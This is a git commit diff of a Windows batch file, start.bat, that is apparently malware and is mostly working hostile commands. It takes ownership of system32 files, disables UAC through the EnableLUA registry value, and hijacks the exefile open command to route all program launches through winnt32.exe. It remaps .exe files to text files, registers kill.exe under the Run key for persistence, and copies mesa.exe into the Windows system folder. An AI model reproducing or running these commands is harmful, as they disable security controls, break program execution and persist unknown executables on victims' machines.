46b86e59998a9afbc3ed00f6982291e7a25fc9ee
gachao0 <139936691+gachao0@users.noreply.github.com>
2023-07-24 13:44:53 +0900

    start.bat

--- start.bat
+++ start.bat
@@ -15,11 +15,10 @@ takeown /f C:\Windows\system32\charmap.exe & icacls C:\Windows\system32\charmap.
 
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
-reg
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f
 reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "pic\back.png" /f
 reg add HKEY_CLASSES_ROOT\exefile\shell\open\command /d C:\Windows\winnt32.exe"%1"%* /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.exe" /d "txtfile"
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.exe" /d "txtfile" /f
 set a=%cd%\kill.exe
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "kill" /d  "%a%" /f
 copy "block\mesa.exe" "C:\Windows\system"
